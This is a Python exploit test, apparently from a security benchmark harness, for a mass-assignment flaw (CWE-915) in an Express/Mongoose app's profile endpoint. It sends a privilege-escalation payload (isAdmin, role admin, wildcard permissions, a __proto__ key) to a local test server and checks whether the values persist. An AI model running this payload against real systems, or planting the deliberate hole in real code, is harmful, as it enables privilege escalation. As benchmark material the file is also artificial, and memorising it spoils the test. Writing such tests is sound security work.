"""PoC exploit: Mass assignment via Mongoose Mixed type + markModified on profile (CWE-915).

After the 3-stage chain, PATCH /v1/users/:id/profile accepts arbitrary
JSON and persists it to MongoDB via Object.assign() + markModified().
The profile field is Schema.Types.Mixed with no validation — any key/value
pair the attacker sends is stored verbatim.

The attack:
1. Authenticate as any user (or admin)
2. PATCH /v1/users/:id/profile with { "isAdmin": true, "role": "admin" }
3. The arbitrary data persists to the user document in MongoDB
4. If any middleware, template, or downstream service reads user.profile.role
   or user.profile.isAdmin, the attacker gains elevated privileges

Even without explicit reads of profile fields, storing arbitrary
user-controlled data in a Mixed field is a mass assignment vulnerability —
the application has no control over what keys are written.
"""

from mosaic.oracle.exploit import ExploitTest


class MarkModifiedProfileExploit(ExploitTest):
    """Mass assignment via Mongoose Mixed type profile with markModified persistence."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)
        self._token: str = ""
        self._user_id: str = ""
        self._admin_token: str = ""

    @property
    def chain_id(self) -> str:
        return "express_mark_modified_profile"

    def setup(self) -> None:
        """Create test users and obtain auth tokens."""
        user = {
            "name": "Profile Test User",
            "email": "profile_test@example.com",
            "password": "testPassword123",
        }

        _reg = self.http_post("/v1/auth/register", json=user)
        if _reg.status_code == 400 and "role" in user:
            user_nr = {k: v for k, v in user.items() if k != "role"}
            _reg = self.http_post("/v1/auth/register", json=user_nr)
        resp = self.http_post("/v1/auth/login", json={
            "email": user["email"],
            "password": user["password"],
        })

        if not resp.ok:
            raise ConnectionError(
                f"Could not register or log in test user: "
                f"{resp.status_code} {resp.text[:200]}"
            )

        data = resp.json()
        tokens = data.get("tokens", {})
        self._token = (
            tokens.get("access", {}).get("token", "")
            or data.get("token", "")
            or data.get("accessToken", "")
        )
        user_data = data.get("user", {})
        self._user_id = (
            user_data.get("id", "")
            or user_data.get("_id", "")
            or data.get("id", "")
        )

        if not self._token:
            raise ConnectionError("Could not obtain auth token")
        if not self._user_id:
            raise ConnectionError("Could not obtain user ID")

        # Create admin (PATCH requires manageUsers)
        admin = {
            "name": "Profile Admin",
            "email": "profile_admin@example.com",
            "password": "adminPassword123",
            "role": "admin",
        }
        _reg = self.http_post("/v1/auth/register", json=admin)
        if _reg.status_code == 400 and "role" in admin:
            admin_nr = {k: v for k, v in admin.items() if k != "role"}
            _reg = self.http_post("/v1/auth/register", json=admin_nr)
        resp = self.http_post("/v1/auth/login", json={
            "email": admin["email"],
            "password": admin["password"],
        })
        if resp.ok:
            data = resp.json()
            tokens = data.get("tokens", {})
            self._admin_token = (
                tokens.get("access", {}).get("token", "")
                or data.get("token", "")
            )

    def execute(self) -> tuple[bool, str]:
        """PATCH profile with privilege escalation payload and verify persistence."""
        admin_token = self._admin_token or self._token
        read_token = self._token
        if not admin_token or not self._user_id:
            return False, "Setup failed: no token or user ID"

        admin_auth = {"Authorization": f"Bearer {admin_token}"}
        read_auth = {"Authorization": f"Bearer {read_token}"}

        evidence_parts = []
        vuln_found = False

        # Step 1: GET initial profile (should be empty)
        resp_init = self.http_get(
            f"/v1/users/{self._user_id}/profile",
            headers=read_auth,
        )

        if not resp_init.ok:
            return False, (
                f"Profile endpoint not available: "
                f"{resp_init.status_code} {resp_init.text[:200]}"
            )

        initial = resp_init.json() if resp_init.text.strip() else {}
        evidence_parts.append(f"Initial profile: {initial}")

        # Step 2: PATCH with mass assignment payload
        payload = {
            "isAdmin": True,
            "role": "admin",
            "permissions": ["*"],
            "__proto__": {"admin": True},
        }

        resp_patch = self.http_patch(
            f"/v1/users/{self._user_id}/profile",
            json=payload,
            headers=admin_auth,
        )

        if not resp_patch.ok:
            return False, (
                f"PATCH profile failed: "
                f"{resp_patch.status_code} {resp_patch.text[:200]}"
            )

        patched = resp_patch.json() if resp_patch.text.strip() else {}
        evidence_parts.append(f"PATCH response: {patched}")

        # Step 3: GET profile again to verify persistence
        resp_verify = self.http_get(
            f"/v1/users/{self._user_id}/profile",
            headers=read_auth,
        )

        if not resp_verify.ok:
            return False, (
                f"GET profile after PATCH failed: "
                f"{resp_verify.status_code} {resp_verify.text[:200]}"
            )

        verified = resp_verify.json() if resp_verify.text.strip() else {}

        # Check if the payload persisted
        if verified.get("isAdmin") is True:
            evidence_parts.append(
                "isAdmin: true persisted in profile — privilege escalation field stored."
            )
            vuln_found = True

        if verified.get("role") == "admin":
            evidence_parts.append(
                "role: 'admin' persisted in profile — role override stored."
            )
            vuln_found = True

        if verified.get("permissions") == ["*"]:
            evidence_parts.append(
                "permissions: ['*'] persisted — wildcard permission stored."
            )
            vuln_found = True

        # Check PATCH response as fallback
        if not vuln_found and patched.get("isAdmin") is True:
            evidence_parts.append(
                "isAdmin: true returned in PATCH response (persistence unconfirmed)."
            )
            if verified.get("isAdmin") is not True:
                evidence_parts.append(
                    "BUT GET does not reflect changes — markModified may be missing."
                )
            else:
                vuln_found = True

        if vuln_found:
            return True, (
                f"Mass assignment via Mixed profile (CWE-915). "
                f"Arbitrary user-controlled JSON persists to MongoDB via "
                f"PATCH /v1/users/:id/profile. "
                + " ".join(evidence_parts)
            )

        return False, (
            f"Profile changes did not persist. Either markModified is "
            f"missing (stage 3 not applied) or the endpoint is not "
            f"functional. " + " ".join(evidence_parts)
        )
